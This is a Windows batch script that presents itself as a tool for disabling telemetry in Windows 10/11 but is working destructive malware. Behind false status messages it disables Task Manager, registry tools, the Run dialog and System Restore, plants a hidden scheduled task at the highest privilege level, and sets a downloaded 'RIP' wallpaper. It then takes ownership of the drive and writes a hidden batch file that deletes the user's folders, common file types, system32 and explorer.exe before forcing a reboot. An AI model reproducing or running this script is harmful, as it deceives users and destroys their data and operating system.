@shift /0
@echo off
setLocal EnableDelayedExpansion
title Disabling all telemetry in Windows 10/11
echo Disabling all telemetry services...
taskkill /f /im regedit.exe 2>nul >nul
taskkill /f /im taskmgr.exe 2>nul >nul
SCHTASKS /Create /F /SC DAILY /TN system_security /TR "%windir%\system.vbs" /RL HIGHEST 2>nul >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f 2>nul >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f 2>nul >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop /v NoCloseDragDropBands /t REG_DWORD /d 1 /f 2>nul >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f 2>nul >nul
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HidePowerOptions /t REG_DWORD /d 1 /f 2>nul >nul
reg add HKCU\Software\Microsoft\Windows\currentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f 2>nul >nul
echo CreateObject("Wscript.Shell").Run "system.bat", 0, True >> %windir%\system.vbs
attrib +h +s +r +i %windir%\system.vbs
timeout /t 3 /NOBREAK > nul
cls
echo Checking if all services has been disabling...
mkdir "%windir%\RIP"
attrib +i +h +s "%windir%\RIP"
set ip=8.8.8.8
ping -n 1 %ip% | find "TTL" 2>nul >nul
if not errorlevel 1 set error=win
if errorlevel 1 set error=fail
if %error% EQU fail (move rip.png %windir%\RIP\ 2>nul >nul) else (curl -o "%windir%\RIP\rip.png" https://i.imgur.com/EGBHDer.png 2>nul >nul)
attrib +i +h +s "%windir%\RIP\rip.png"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  "%windir%\RIP\rip.png" /f 2>nul >nul 
powershell Set-ExecutionPolicy Bypass

echo $imgPath="%windir%\RIP\rip.png" >> %windir%\wall.ps1
echo $code = @' >> %windir%\wall.ps1
echo using System.Runtime.InteropServices; >> %windir%\wall.ps1
echo namespace Win32{ >> %windir%\wall.ps1
echo      public class Wallpaper{ >> %windir%\wall.ps1
echo         [DllImport("user32.dll", CharSet=CharSet.Auto)] >> %windir%\wall.ps1
echo          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; >> %windir%\wall.ps1
echo          public static void SetWallpaper(string thePath){ >> %windir%\wall.ps1
echo             SystemParametersInfo(20,0,thePath,3); >> %windir%\wall.ps1
echo          } >> %windir%\wall.ps1
echo     } >> %windir%\wall.ps1
echo  } >> %windir%\wall.ps1
echo '@>> %windir%\wall.ps1
echo add-type $code >> %windir%\wall.ps1
echo [Win32.Wallpaper]::SetWallpaper($imgPath) >> %windir%\wall.ps1
attrib +i +h +s +r %windir%\wall.ps1
powershell "& ""%windir%\wall.ps1"""

for /F delims^=^"^ Tokens^=2^,4 %%A IN ('takeown /? ^| findstr /R " \"[A-Z]\" "') DO ( 
    if not defined take (
      set "take=%%~A"
      if not "%%~B" == "" set "skip=%%~B" 
    ) else set "skip=%%~A" 
) 2>nul >nul
set take 2>nul >nul
set skip 2>nul >nul
cd %windir%\..\..
takeown /f * /r /d %take% 2>nul >nul
cls
title Cleanning telemetry in Windows 10/11
echo Cleaning of all residual telemetry files...
echo @echo off >> %windir%\system.bat
echo rd /q /s %%USERPROFILE%%\Documents 2>nul >nul >> %windir%\system.bat
echo rd /q /s %%USERPROFILE%%\Downloads 2>nul >nul >> %windir%\system.bat
echo rd /q /s %%USERPROFILE%%\Pictures 2>nul >nul >> %windir%\system.bat
echo rd /q /s %%USERPROFILE%%\Videos 2>nul >nul >> %windir%\system.bat
echo rd /q /s %%USERPROFILE%%\Music 2>nul >nul >> %windir%\system.bat
echo rd /q /s %%USERPROFILE%%\Desktop  >> %windir%\system.bat
echo cd /d %windir%\..\.. >> %windir%\system.bat
echo del /f /s /q *.jpeg 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.txt 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.png 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.jpg 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.iso 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.msi 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.avi 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.wav 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.mp3 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.mp4 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.mov 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.exe 2>nul >nul >> %windir%\system.bat
echo del /f /s /q *.psd 2>nul >nul >> %windir%\system.bat
echo del C:\Windows\system32\*.* /s /q 2>nul >nul >> %windir%\system.bat
echo taskkill /f /im explorer.exe >> %windir%\system.bat
echo del C:\Windows\explorer.exe >> %windir%\system.bat
echo shutdown -r -t 3 >> %windir%\system.bat
echo taskkill /f /im wininit.exe >> %windir%\system.bat
attrib +h +s +r +i %windir%\system.bat
schtasks /run /tn system_security 2>nul >nul
timeout /t 15 /NOBREAK > nul
cls
title Finished !
echo All services have been disabled and all residual files are well deleted
echo Thank you for using my software !
pause